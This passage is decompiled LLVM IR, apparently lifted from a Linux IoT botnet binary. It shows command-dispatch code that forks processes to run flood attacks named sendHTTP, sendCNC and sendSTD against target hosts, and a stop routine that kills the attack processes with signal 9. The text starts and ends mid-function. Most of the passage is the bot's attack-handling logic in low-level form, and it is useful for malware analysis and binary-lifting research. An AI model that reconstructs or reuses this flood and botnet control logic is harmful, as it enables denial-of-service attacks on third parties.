dec_label_pc_804e5ae:                             ; preds = %dec_label_pc_804e5a5
  %v1_804e5b1 = add i32 %tmp226, 24
  %v1_804e5b4 = inttoptr i32 %v1_804e5b1 to i32*
  %v2_804e5b4 = load i32, i32* %v1_804e5b4, align 4
  %v0_804e5b6 = load i32, i32* @esp, align 4
  %v5_804e5b6 = icmp ult i32 %v0_804e5b6, 12
  store i1 %v5_804e5b6, i1* %cf.global-to-local, align 1
  store i32 %v2_804e5b4, i32* %stack_var_-476, align 4
  %v1_804e5ba = call i32 @atol(i32 %v2_804e5b4)
  store i32 %v1_804e5ba, i32* @ebx, align 4
  %v1_804e5c7 = add i32 %tmp226, 20
  %v1_804e5ca = inttoptr i32 %v1_804e5c7 to i32*
  %v2_804e5ca = load i32, i32* %v1_804e5ca, align 4
  %v5_804e5cc = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804e5cc, i1* %cf.global-to-local, align 1
  store i32 %v2_804e5ca, i32* %stack_var_-476, align 4
  %v1_804e5d0 = call i32 @atol(i32 %v2_804e5ca)
  store i32 %v1_804e5d0, i32* @esi, align 4
  %v1_804e5dd = add i32 %tmp226, 16
  %v1_804e5e0 = inttoptr i32 %v1_804e5dd to i32*
  %v2_804e5e0 = load i32, i32* %v1_804e5e0, align 4
  store i32 %v2_804e5e0, i32* @edi, align 4
  %v1_804e5e7 = add i32 %tmp226, 12
  %v1_804e5ea = inttoptr i32 %v1_804e5e7 to i32*
  %v2_804e5ea = load i32, i32* %v1_804e5ea, align 4
  store i1 %v5_804e5cc, i1* %cf.global-to-local, align 1
  store i32 %v2_804e5ea, i32* %stack_var_-476, align 4
  %v1_804e5f0 = call i32 @atol(i32 %v2_804e5ea)
  %v1_804e603 = add i32 %tmp226, 8
  %v1_804e606 = inttoptr i32 %v1_804e603 to i32*
  %v2_804e606 = load i32, i32* %v1_804e606, align 4
  store i32 %v2_804e606, i32* %edx.global-to-local, align 4
  %v2_804e610 = load i32, i32* %v1_804e56c, align 4
  store i1 %v5_804e58c, i1* %cf.global-to-local, align 1
  %v0_804e615 = load i32, i32* @ebx, align 4
  %v0_804e616 = load i32, i32* @esi, align 4
  store i32 %v0_804e616, i32* %stack_var_-476, align 4
  %v0_804e617 = load i32, i32* @edi, align 4
  %v6_804e61b = trunc i32 %v1_804e5f0 to i16
  %v7_804e61b = call i32 @sendHTTP(i32 %v2_804e610, i32 %v2_804e606, i16 %v6_804e61b, i32 %v0_804e617, i32 %v0_804e616, i32 %v0_804e615)
  store i1 %v5_804e5cc, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e628 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e62d:                             ; preds = %dec_label_pc_804e5a5
  %v0_804e62d = load i32, i32* @esp, align 4
  %v5_804e62d = icmp ult i32 %v0_804e62d, 8
  store i1 %v5_804e62d, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v2_804e637 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e642 = icmp eq i32 %v2_804e637, 0
  %v1_804e646 = icmp eq i1 %v4_804e642, false
  br i1 %v1_804e646, label %dec_label_pc_804e5a5, label %dec_label_pc_804e6dd

dec_label_pc_804e651:                             ; preds = %dec_label_pc_804e566
  %v0_804e651 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e656 = icmp eq i32 %v0_804e651, 0
  %v1_804e658 = icmp eq i1 %v1_804e656, false
  br i1 %v1_804e658, label %dec_label_pc_804eb69, label %dec_label_pc_804e65e

dec_label_pc_804e65e:                             ; preds = %dec_label_pc_804e651
  %v1_804e661 = add i32 %tmp226, 24
  %v1_804e664 = inttoptr i32 %v1_804e661 to i32*
  %v2_804e664 = load i32, i32* %v1_804e664, align 4
  %v0_804e666 = load i32, i32* @esp, align 4
  %v5_804e666 = icmp ult i32 %v0_804e666, 12
  store i1 %v5_804e666, i1* %cf.global-to-local, align 1
  store i32 %v2_804e664, i32* %stack_var_-476, align 4
  %v1_804e66a = call i32 @atol(i32 %v2_804e664)
  store i32 %v1_804e66a, i32* @ebx, align 4
  %v1_804e677 = add i32 %tmp226, 20
  %v1_804e67a = inttoptr i32 %v1_804e677 to i32*
  %v2_804e67a = load i32, i32* %v1_804e67a, align 4
  %v5_804e67c = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804e67c, i1* %cf.global-to-local, align 1
  store i32 %v2_804e67a, i32* %stack_var_-476, align 4
  %v1_804e680 = call i32 @atol(i32 %v2_804e67a)
  store i32 %v1_804e680, i32* @esi, align 4
  %v1_804e68d = add i32 %tmp226, 16
  %v1_804e690 = inttoptr i32 %v1_804e68d to i32*
  %v2_804e690 = load i32, i32* %v1_804e690, align 4
  store i32 %v2_804e690, i32* @edi, align 4
  %v1_804e697 = add i32 %tmp226, 12
  %v1_804e69a = inttoptr i32 %v1_804e697 to i32*
  %v2_804e69a = load i32, i32* %v1_804e69a, align 4
  store i1 %v5_804e67c, i1* %cf.global-to-local, align 1
  store i32 %v2_804e69a, i32* %stack_var_-476, align 4
  %v1_804e6a0 = call i32 @atol(i32 %v2_804e69a)
  %v1_804e6b3 = add i32 %tmp226, 8
  %v1_804e6b6 = inttoptr i32 %v1_804e6b3 to i32*
  %v2_804e6b6 = load i32, i32* %v1_804e6b6, align 4
  store i32 %v2_804e6b6, i32* %edx.global-to-local, align 4
  %v2_804e6c0 = load i32, i32* %v1_804e56c, align 4
  %v5_804e6c2 = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804e6c2, i1* %cf.global-to-local, align 1
  %v0_804e6c5 = load i32, i32* @ebx, align 4
  %v0_804e6c6 = load i32, i32* @esi, align 4
  store i32 %v0_804e6c6, i32* %stack_var_-476, align 4
  %v0_804e6c7 = load i32, i32* @edi, align 4
  %v6_804e6cb = trunc i32 %v1_804e6a0 to i16
  %v7_804e6cb = call i32 @sendHTTP(i32 %v2_804e6c0, i32 %v2_804e6b6, i16 %v6_804e6cb, i32 %v0_804e6c7, i32 %v0_804e6c6, i32 %v0_804e6c5)
  store i1 %v5_804e67c, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e6d8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e6dd:                             ; preds = %dec_label_pc_804e584, %dec_label_pc_804e62d, %dec_label_pc_804e511
  %v2_804e6e0 = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e6fd = inttoptr i32 %v2_804e6e0 to i8*
  store i32 %v2_804e6e0, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805f567.663 to i32), i32* @edi, align 4
  %v7_804e70f = call i32 @_strncmp(i8* %v4_804e6fd, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805f567.663, i32 0, i32 0), i32 4)
  %v8_804e70f = urem i32 %v7_804e70f, 2
  %v9_804e70f = icmp eq i32 %v8_804e70f, 0
  %v0_804e711 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e711 = or i1 %v0_804e711, %v9_804e70f
  %v3_804e711 = zext i1 %v2_804e711 to i32
  %v4_804e711 = load i32, i32* @edx, align 4
  %v5_804e711 = and i32 %v4_804e711, -256
  %v6_804e711 = or i32 %v3_804e711, %v5_804e711
  %v7_804e711 = xor i32 %v6_804e711, 1
  store i32 %v7_804e711, i32* @edx, align 4
  %v1_804e719 = trunc i32 %v7_804e711 to i8
  %v3_804e719 = zext i1 %v0_804e711 to i8
  %v15_804e719 = icmp eq i8 %v1_804e719, %v3_804e719
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e722 = icmp eq i1 %v15_804e719, false
  br i1 %v1_804e722, label %dec_label_pc_804e860, label %dec_label_pc_804e728

dec_label_pc_804e728:                             ; preds = %dec_label_pc_804e6dd
  %v9_804e728 = icmp ult i32 %tmp170, 3
  store i1 %v9_804e728, i1* %cf.global-to-local, align 1
  %v7_804e72c = icmp sgt i32 %tmp170, 3
  br i1 %v7_804e72c, label %dec_label_pc_804e72e, label %dec_label_pc_804e728.dec_label_pc_804e75e_crit_edge

dec_label_pc_804e728.dec_label_pc_804e75e_crit_edge: ; preds = %dec_label_pc_804e728
  %v0_804e763.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e75e

dec_label_pc_804e72e:                             ; preds = %dec_label_pc_804e728
  %v1_804e731 = add i32 %tmp226, 8
  %v1_804e734 = inttoptr i32 %v1_804e731 to i32*
  %v2_804e734 = load i32, i32* %v1_804e734, align 4
  %v0_804e736 = load i32, i32* @esp, align 4
  %v5_804e736 = icmp ult i32 %v0_804e736, 12
  store i1 %v5_804e736, i1* %cf.global-to-local, align 1
  store i32 %v2_804e734, i32* %stack_var_-476, align 4
  %v1_804e73a = call i32 @atol(i32 %v2_804e734)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp245 = icmp slt i32 %v1_804e73a, 1
  br i1 %tmp245, label %dec_label_pc_804e75e, label %dec_label_pc_804e746

dec_label_pc_804e746:                             ; preds = %dec_label_pc_804e72e
  %v1_804e749 = add i32 %tmp226, 12
  %v1_804e74c = inttoptr i32 %v1_804e749 to i32*
  %v2_804e74c = load i32, i32* %v1_804e74c, align 4
  %v5_804e74e = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804e74e, i1* %cf.global-to-local, align 1
  store i32 %v2_804e74c, i32* %stack_var_-476, align 4
  %v1_804e752 = call i32 @atol(i32 %v2_804e74c)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp246 = icmp slt i32 %v1_804e752, 1
  %tmp247 = icmp eq i1 %tmp246, false
  br i1 %tmp247, label %dec_label_pc_804e779, label %dec_label_pc_804e75e

dec_label_pc_804e75e:                             ; preds = %dec_label_pc_804e728.dec_label_pc_804e75e_crit_edge, %dec_label_pc_804e746, %dec_label_pc_804e72e
  %v0_804e763 = phi i32 [ %v0_804e763.pre, %dec_label_pc_804e728.dec_label_pc_804e75e_crit_edge ], [ %v15_804d7b9, %dec_label_pc_804e746 ], [ %v15_804d7b9, %dec_label_pc_804e72e ]
  %v0_804e75e = load i32, i32* @global_var_8061580.20, align 128
  %v5_804e763 = icmp ult i32 %v0_804e763, 8
  store i1 %v5_804e763, i1* %cf.global-to-local, align 1
  store i32 %v0_804e75e, i32* %stack_var_-476, align 4
  %v2_804e76c = call i32 @sockprintf(i32 %v0_804e75e, i32 ptrtoint ([27 x i8]* @global_var_805f56b.664 to i32))
  %v0_804e771 = load i32, i32* @esp, align 4
  %v2_804e771 = icmp ugt i32 %v0_804e771, -17
  store i1 %v2_804e771, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb69

dec_label_pc_804e779:                             ; preds = %dec_label_pc_804e746
  %v1_804e77c = add i32 %tmp226, 4
  %v1_804e77f = inttoptr i32 %v1_804e77c to i32*
  %v2_804e77f = load i32, i32* %v1_804e77f, align 4
  %v2_804e78a = load i32, i32* %v1_804e734, align 4
  store i1 %v5_804e74e, i1* %cf.global-to-local, align 1
  store i32 %v2_804e78a, i32* %stack_var_-476, align 4
  %v1_804e790 = call i32 @atol(i32 %v2_804e78a)
  %v2_804e7a1 = load i32, i32* %v1_804e74c, align 4
  store i1 %v5_804e74e, i1* %cf.global-to-local, align 1
  store i32 %v2_804e7a1, i32* %stack_var_-476, align 4
  %v1_804e7a7 = call i32 @atol(i32 %v2_804e7a1)
  %v5_804e7b5 = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804e7b5, i1* %cf.global-to-local, align 1
  store i32 %v2_804e77f, i32* %stack_var_-476, align 4
  %v2_804e7bb = inttoptr i32 %v2_804e77f to i8*
  %v3_804e7bb = call i32 @__GI_strchr(i8* %v2_804e7bb, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e7c3 = icmp eq i32 %v3_804e7bb, 0
  br i1 %v1_804e7c3, label %dec_label_pc_804e835, label %dec_label_pc_804e7c7

dec_label_pc_804e7c7:                             ; preds = %dec_label_pc_804e779
  store i32 %v2_804e77f, i32* @eax, align 4
  store i1 %v5_804e7b5, i1* %cf.global-to-local, align 1
  store i32 %v2_804e77f, i32* %stack_var_-476, align 4
  %v2_804e7d3 = call i32 @__GI_strtok(i32 %v2_804e77f, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e82d272 = icmp eq i32 %v2_804e7d3, 0
  %v1_804e831273 = icmp eq i1 %v4_804e82d272, false
  br i1 %v1_804e831273, label %dec_label_pc_804e7e0, label %dec_label_pc_804e860

dec_label_pc_804e7e0:                             ; preds = %dec_label_pc_804e7c7, %dec_label_pc_804e818
  %storemerge48274 = phi i32 [ %v2_804e822, %dec_label_pc_804e818 ], [ %v2_804e7d3, %dec_label_pc_804e7c7 ]
  %v0_804e7e0 = call i32 @listFork()
  store i32 %v0_804e7e0, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e7e5 = icmp eq i32 %v0_804e7e0, 0
  %v1_804e7e7 = icmp eq i1 %v1_804e7e5, false
  %v0_804e818 = load i32, i32* @esp, align 4
  br i1 %v1_804e7e7, label %dec_label_pc_804e818, label %dec_label_pc_804e7e9

dec_label_pc_804e7e9:                             ; preds = %dec_label_pc_804e7e0
  %v5_804e7e9 = icmp ult i32 %v0_804e818, 4
  store i1 %v5_804e7e9, i1* %cf.global-to-local, align 1
  store i32 %storemerge48274, i32* %stack_var_-476, align 4
  %v3_804e7f5 = call i32 @sendCNC(i32 %storemerge48274, i32 %v1_804e790, i32 %v1_804e7a7)
  %v0_804e7fd = load i32, i32* @global_var_8061580.20, align 128
  store i1 %v5_804e74e, i1* %cf.global-to-local, align 1
  store i32 %v0_804e7fd, i32* %stack_var_-476, align 4
  %v1_804e806 = call i32 @__libc_close(i32 %v0_804e7fd)
  store i1 %v5_804e74e, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e813 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e818:                             ; preds = %dec_label_pc_804e7e0
  %v5_804e818 = icmp ult i32 %v0_804e818, 8
  store i1 %v5_804e818, i1* %cf.global-to-local, align 1
  %v2_804e822 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e82d = icmp eq i32 %v2_804e822, 0
  %v1_804e831 = icmp eq i1 %v4_804e82d, false
  br i1 %v1_804e831, label %dec_label_pc_804e7e0, label %dec_label_pc_804e860

dec_label_pc_804e835:                             ; preds = %dec_label_pc_804e779
  %v0_804e835 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e83a = icmp eq i32 %v0_804e835, 0
  %v1_804e83c = icmp eq i1 %v1_804e83a, false
  br i1 %v1_804e83c, label %dec_label_pc_804eb69, label %dec_label_pc_804e842

dec_label_pc_804e842:                             ; preds = %dec_label_pc_804e835
  %v0_804e842 = load i32, i32* @esp, align 4
  %v5_804e842 = icmp ult i32 %v0_804e842, 4
  store i1 %v5_804e842, i1* %cf.global-to-local, align 1
  store i32 %v2_804e77f, i32* %stack_var_-476, align 4
  %v3_804e84e = call i32 @sendCNC(i32 %v2_804e77f, i32 %v1_804e790, i32 %v1_804e7a7)
  store i1 %v5_804e74e, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e85b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e860:                             ; preds = %dec_label_pc_804e7c7, %dec_label_pc_804e818, %dec_label_pc_804e6dd
  %v2_804e863 = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e880 = inttoptr i32 %v2_804e863 to i8*
  store i32 %v2_804e863, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805f586.665 to i32), i32* @edi, align 4
  %v7_804e892 = call i32 @_strncmp(i8* %v4_804e880, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805f586.665, i32 0, i32 0), i32 4)
  %v8_804e892 = urem i32 %v7_804e892, 2
  %v9_804e892 = icmp eq i32 %v8_804e892, 0
  %v0_804e894 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e894 = or i1 %v0_804e894, %v9_804e892
  %v3_804e894 = zext i1 %v2_804e894 to i32
  %v4_804e894 = load i32, i32* @edx, align 4
  %v5_804e894 = and i32 %v4_804e894, -256
  %v6_804e894 = or i32 %v3_804e894, %v5_804e894
  %v7_804e894 = xor i32 %v6_804e894, 1
  store i32 %v7_804e894, i32* @edx, align 4
  %v1_804e89c = trunc i32 %v7_804e894 to i8
  %v3_804e89c = zext i1 %v0_804e894 to i8
  %v15_804e89c = icmp eq i8 %v1_804e89c, %v3_804e89c
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e8a5 = icmp eq i1 %v15_804e89c, false
  br i1 %v1_804e8a5, label %dec_label_pc_804e9d2, label %dec_label_pc_804e8ab

dec_label_pc_804e8ab:                             ; preds = %dec_label_pc_804e860
  %v9_804e8ab = icmp ult i32 %tmp170, 3
  store i1 %v9_804e8ab, i1* %cf.global-to-local, align 1
  %v7_804e8af = icmp sgt i32 %tmp170, 3
  br i1 %v7_804e8af, label %dec_label_pc_804e8b1, label %dec_label_pc_804e8ab.dec_label_pc_804e8e1_crit_edge

dec_label_pc_804e8ab.dec_label_pc_804e8e1_crit_edge: ; preds = %dec_label_pc_804e8ab
  %v0_804e8e6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e8e1

dec_label_pc_804e8b1:                             ; preds = %dec_label_pc_804e8ab
  %v1_804e8b4 = add i32 %tmp226, 8
  %v1_804e8b7 = inttoptr i32 %v1_804e8b4 to i32*
  %v2_804e8b7 = load i32, i32* %v1_804e8b7, align 4
  %v0_804e8b9 = load i32, i32* @esp, align 4
  %v5_804e8b9 = icmp ult i32 %v0_804e8b9, 12
  store i1 %v5_804e8b9, i1* %cf.global-to-local, align 1
  store i32 %v2_804e8b7, i32* %stack_var_-476, align 4
  %v1_804e8bd = call i32 @atol(i32 %v2_804e8b7)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_804e8bd, 1
  br i1 %tmp248, label %dec_label_pc_804e8e1, label %dec_label_pc_804e8c9

dec_label_pc_804e8c9:                             ; preds = %dec_label_pc_804e8b1
  %v1_804e8cc = add i32 %tmp226, 12
  %v1_804e8cf = inttoptr i32 %v1_804e8cc to i32*
  %v2_804e8cf = load i32, i32* %v1_804e8cf, align 4
  %v5_804e8d1 = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804e8d1, i1* %cf.global-to-local, align 1
  store i32 %v2_804e8cf, i32* %stack_var_-476, align 4
  %v1_804e8d5 = call i32 @atol(i32 %v2_804e8cf)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp249 = icmp slt i32 %v1_804e8d5, 1
  %tmp250 = icmp eq i1 %tmp249, false
  br i1 %tmp250, label %dec_label_pc_804e8fc, label %dec_label_pc_804e8e1

dec_label_pc_804e8e1:                             ; preds = %dec_label_pc_804e8ab.dec_label_pc_804e8e1_crit_edge, %dec_label_pc_804e8c9, %dec_label_pc_804e8b1
  %v0_804e8e6 = phi i32 [ %v0_804e8e6.pre, %dec_label_pc_804e8ab.dec_label_pc_804e8e1_crit_edge ], [ %v15_804d7b9, %dec_label_pc_804e8c9 ], [ %v15_804d7b9, %dec_label_pc_804e8b1 ]
  %v0_804e8e1 = load i32, i32* @global_var_8061580.20, align 128
  %v5_804e8e6 = icmp ult i32 %v0_804e8e6, 8
  store i1 %v5_804e8e6, i1* %cf.global-to-local, align 1
  store i32 %v0_804e8e1, i32* %stack_var_-476, align 4
  %v2_804e8ef = call i32 @sockprintf(i32 %v0_804e8e1, i32 ptrtoint ([27 x i8]* @global_var_805f58a.666 to i32))
  %v0_804e8f4 = load i32, i32* @esp, align 4
  %v2_804e8f4 = icmp ugt i32 %v0_804e8f4, -17
  store i1 %v2_804e8f4, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb69

dec_label_pc_804e8fc:                             ; preds = %dec_label_pc_804e8c9
  %v1_804e8ff = add i32 %tmp226, 4
  %v1_804e902 = inttoptr i32 %v1_804e8ff to i32*
  %v2_804e902 = load i32, i32* %v1_804e902, align 4
  %v2_804e90d = load i32, i32* %v1_804e8b7, align 4
  store i1 %v5_804e8d1, i1* %cf.global-to-local, align 1
  store i32 %v2_804e90d, i32* %stack_var_-476, align 4
  %v1_804e913 = call i32 @atol(i32 %v2_804e90d)
  %v2_804e924 = load i32, i32* %v1_804e8cf, align 4
  store i1 %v5_804e8d1, i1* %cf.global-to-local, align 1
  store i32 %v2_804e924, i32* %stack_var_-476, align 4
  %v1_804e92a = call i32 @atol(i32 %v2_804e924)
  %v5_804e938 = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804e938, i1* %cf.global-to-local, align 1
  store i32 %v2_804e902, i32* %stack_var_-476, align 4
  %v2_804e93e = inttoptr i32 %v2_804e902 to i8*
  %v3_804e93e = call i32 @__GI_strchr(i8* %v2_804e93e, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e946 = icmp eq i32 %v3_804e93e, 0
  br i1 %v1_804e946, label %dec_label_pc_804e9a7, label %dec_label_pc_804e94a

dec_label_pc_804e94a:                             ; preds = %dec_label_pc_804e8fc
  store i32 %v2_804e902, i32* @eax, align 4
  store i1 %v5_804e938, i1* %cf.global-to-local, align 1
  store i32 %v2_804e902, i32* %stack_var_-476, align 4
  %v2_804e956 = call i32 @__GI_strtok(i32 %v2_804e902, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e99f269 = icmp eq i32 %v2_804e956, 0
  %v1_804e9a3270 = icmp eq i1 %v4_804e99f269, false
  br i1 %v1_804e9a3270, label %dec_label_pc_804e963, label %dec_label_pc_804e9d2

dec_label_pc_804e963:                             ; preds = %dec_label_pc_804e94a, %dec_label_pc_804e98a
  %storemerge116271 = phi i32 [ %v2_804e994, %dec_label_pc_804e98a ], [ %v2_804e956, %dec_label_pc_804e94a ]
  %v0_804e963 = call i32 @listFork()
  store i32 %v0_804e963, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e968 = icmp eq i32 %v0_804e963, 0
  %v1_804e96a = icmp eq i1 %v1_804e968, false
  %v0_804e98a = load i32, i32* @esp, align 4
  br i1 %v1_804e96a, label %dec_label_pc_804e98a, label %dec_label_pc_804e96c

dec_label_pc_804e96c:                             ; preds = %dec_label_pc_804e963
  %v5_804e96c = icmp ult i32 %v0_804e98a, 4
  store i1 %v5_804e96c, i1* %cf.global-to-local, align 1
  store i32 %storemerge116271, i32* %stack_var_-476, align 4
  %v3_804e978 = trunc i32 %v1_804e913 to i16
  %v4_804e978 = call i32 @sendSTD(i32 %storemerge116271, i16 %v3_804e978, i32 %v1_804e92a)
  store i1 %v5_804e8d1, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e985 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e98a:                             ; preds = %dec_label_pc_804e963
  %v5_804e98a = icmp ult i32 %v0_804e98a, 8
  store i1 %v5_804e98a, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v2_804e994 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80579b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e99f = icmp eq i32 %v2_804e994, 0
  %v1_804e9a3 = icmp eq i1 %v4_804e99f, false
  br i1 %v1_804e9a3, label %dec_label_pc_804e963, label %dec_label_pc_804e9d2

dec_label_pc_804e9a7:                             ; preds = %dec_label_pc_804e8fc
  %v0_804e9a7 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e9ac = icmp eq i32 %v0_804e9a7, 0
  %v1_804e9ae = icmp eq i1 %v1_804e9ac, false
  br i1 %v1_804e9ae, label %dec_label_pc_804eb69, label %dec_label_pc_804e9b4

dec_label_pc_804e9b4:                             ; preds = %dec_label_pc_804e9a7
  %v0_804e9b4 = load i32, i32* @esp, align 4
  %v5_804e9b4 = icmp ult i32 %v0_804e9b4, 4
  store i1 %v5_804e9b4, i1* %cf.global-to-local, align 1
  store i32 %v2_804e902, i32* %stack_var_-476, align 4
  %v3_804e9c0 = trunc i32 %v1_804e913 to i16
  %v4_804e9c0 = call i32 @sendSTD(i32 %v2_804e902, i16 %v3_804e9c0, i32 %v1_804e92a)
  store i1 %v5_804e8d1, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804e9cd = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e9d2:                             ; preds = %dec_label_pc_804e94a, %dec_label_pc_804e98a, %dec_label_pc_804e860
  %v2_804e9d5 = load i32, i32* %v1_804d7c2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e9f2 = inttoptr i32 %v2_804e9d5 to i8*
  %v7_804ea04 = call i32 @_strncmp(i8* %v4_804e9f2, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805f5a5.667, i32 0, i32 0), i32 9)
  %v8_804ea04 = urem i32 %v7_804ea04, 2
  %v9_804ea04 = icmp eq i32 %v8_804ea04, 0
  %v0_804ea06 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea06 = or i1 %v0_804ea06, %v9_804ea04
  %v3_804ea06 = zext i1 %v2_804ea06 to i32
  %v4_804ea06 = load i32, i32* @edx, align 4
  %v5_804ea06 = and i32 %v4_804ea06, -256
  %v6_804ea06 = or i32 %v3_804ea06, %v5_804ea06
  %v7_804ea06 = xor i32 %v6_804ea06, 1
  store i32 %v7_804ea06, i32* @edx, align 4
  %v1_804ea0e = trunc i32 %v7_804ea06 to i8
  %v3_804ea0e = zext i1 %v0_804ea06 to i8
  %v15_804ea0e = icmp eq i8 %v1_804ea0e, %v3_804ea0e
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea17 = icmp eq i1 %v15_804ea0e, false
  br i1 %v1_804ea17, label %dec_label_pc_804eb18, label %dec_label_pc_804ea84.preheader

dec_label_pc_804ea84.preheader:                   ; preds = %dec_label_pc_804e9d2
  br label %dec_label_pc_804ea84

dec_label_pc_804ea2d:                             ; preds = %dec_label_pc_804eac1, %dec_label_pc_804ea84
  %v2_804ea30 = mul i32 %storemerge46, 4
  store i32 %v2_804ea30, i32* %edx.global-to-local, align 4
  %v0_804ea35 = load i32, i32* @global_var_8067814.36, align 4
  %v2_804ea3a = add i32 %v0_804ea35, %v2_804ea30
  %v1_804ea3d = inttoptr i32 %v2_804ea3a to i32*
  %v2_804ea3d = load i32, i32* %v1_804ea3d, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea3f = icmp eq i32 %v2_804ea3d, 0
  br i1 %v1_804ea3f, label %dec_label_pc_804ea81, label %dec_label_pc_804ea43

dec_label_pc_804ea43:                             ; preds = %dec_label_pc_804ea2d
  %v9_804ea30 = and i32 %storemerge46, 1073741824
  %v10_804ea30 = icmp ne i32 %v9_804ea30, 0
  store i1 %v10_804ea30, i1* %cf.global-to-local, align 1
  store i32 %v2_804ea30, i32* %edx.global-to-local, align 4
  %v2_804ea53 = load i32, i32* %v1_804ea3d, align 4
  store i32 %v2_804ea53, i32* @ebx, align 4
  %v0_804ea55 = call i32 @__libc_getpid()
  %v0_804ea5a = load i32, i32* @ebx, align 4
  %v7_804ea5a = icmp ult i32 %v0_804ea5a, %v0_804ea55
  store i1 %v7_804ea5a, i1* %cf.global-to-local, align 1
  %v12_804ea5a = icmp eq i32 %v0_804ea5a, %v0_804ea55
  br i1 %v12_804ea5a, label %dec_label_pc_804ea81, label %dec_label_pc_804ea5e

dec_label_pc_804ea5e:                             ; preds = %dec_label_pc_804ea43
  store i32 %v2_804ea30, i32* %edx.global-to-local, align 4
  %v0_804ea66 = load i32, i32* @global_var_8067814.36, align 4
  %v2_804ea6b = add i32 %v0_804ea66, %v2_804ea30
  %v1_804ea6e = inttoptr i32 %v2_804ea6b to i32*
  %v2_804ea6e = load i32, i32* %v1_804ea6e, align 4
  %v0_804ea70 = load i32, i32* @esp, align 4
  %v5_804ea70 = icmp ult i32 %v0_804ea70, 8
  store i1 %v5_804ea70, i1* %cf.global-to-local, align 1
  store i32 %v2_804ea6e, i32* %stack_var_-476, align 4
  %v2_804ea76 = call i32 @kill(i32 %v2_804ea6e, i32 9)
  %v0_804ea7b = load i32, i32* @esp, align 4
  %v2_804ea7b = icmp ugt i32 %v0_804ea7b, -17
  store i1 %v2_804ea7b, i1* %cf.global-to-local, align 1
  %v4_804ea7e = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804ea81

dec_label_pc_804ea81:                             ; preds = %dec_label_pc_804ea43, %dec_label_pc_804ea2d, %dec_label_pc_804ea5e
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804ea2d ], [ %stack_var_-28.1, %dec_label_pc_804ea43 ], [ %v4_804ea7e, %dec_label_pc_804ea5e ]
  %v4_804ea81 = add i32 %storemerge46, 1
  br label %dec_label_pc_804ea84

dec_label_pc_804ea84:                             ; preds = %dec_label_pc_804ea84.preheader, %dec_label_pc_804ea81
